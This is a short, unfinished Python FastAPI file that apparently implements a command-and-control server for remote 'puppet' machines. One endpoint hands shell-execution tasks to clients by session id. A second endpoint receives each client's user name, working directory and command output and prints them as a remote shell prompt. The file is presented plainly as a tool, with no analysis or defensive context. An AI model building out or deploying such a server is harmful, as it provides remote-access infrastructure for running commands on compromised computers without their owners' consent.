from enum import Enum
from typing import Optional

from fastapi import FastAPI, Header, Response
from pydantic import BaseModel

app = FastAPI()

tasks_queue = []


class TaskType(Enum):
    SHELL_EXEC = 1


class PuppetTask(BaseModel):
    session_id: str
    task_type: TaskType
    command: str


class PuppetMessage(BaseModel):
    user: str
    pwd: str
    system_encoding: str
    data: str


# ===================================================================
@app.get('/input',
         responses={200: {"model": PuppetTask},
                    204: {"model": {}}})
async def log(response: Response, session_id: Optional[str] = Header(None)):
    response.status_code = 200
    for task in tasks_queue:
        if task.session_id == session_id:
            return {'task': task.task_type,
                    'command': task.command}
    return {}


@app.post('/output')
async def log(puppet_message: PuppetMessage):
    user = puppet_message.user
    pwd = puppet_message.pwd
    puppet_encoding = puppet_message.system_encoding
    data = puppet_message.data

    print(f"{user}:{pwd}$ {data.encode(puppet_encoding, errors='ignore').decode('utf-8', errors='ignore')}")

    #  fixme: finish this crap
